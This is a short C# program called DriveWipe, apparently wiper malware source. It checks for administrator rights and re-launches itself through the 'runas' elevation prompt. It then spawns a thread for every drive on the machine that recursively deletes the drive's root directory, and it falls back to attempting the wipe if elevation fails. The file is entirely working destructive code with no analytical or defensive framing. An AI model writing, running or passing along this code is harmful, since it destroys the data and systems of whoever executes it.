/*
 * Attempts to wipe all drives using separate threads
 */

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Threading;

namespace DriveWipe
{
    internal class Program
    {
        private static bool IsAdmin()
        {
            try
            {
                using (WindowsIdentity user = WindowsIdentity.GetCurrent())
                {
                    return new WindowsPrincipal(user).IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch (Exception) { }

            return false;
        }

        private static void Wipe()
        {
            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                try
                {
                    new Thread(delegate ()
                    {
                        Directory.Delete(d.Name, true);
                    }).Start();
                }
                catch (Exception) { }
            }   
        }

        static void Main(string[] args)
        {
            if (IsAdmin())
            {
                Wipe();
            } else
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = Assembly.GetExecutingAssembly().Location;
                    psi.UseShellExecute = true;
                    psi.Verb = "runas";

                    Process.Start(psi);

                    Environment.Exit(1);
                } catch (Exception)
                {
                    Wipe();
                }
            }
        }
    }
}
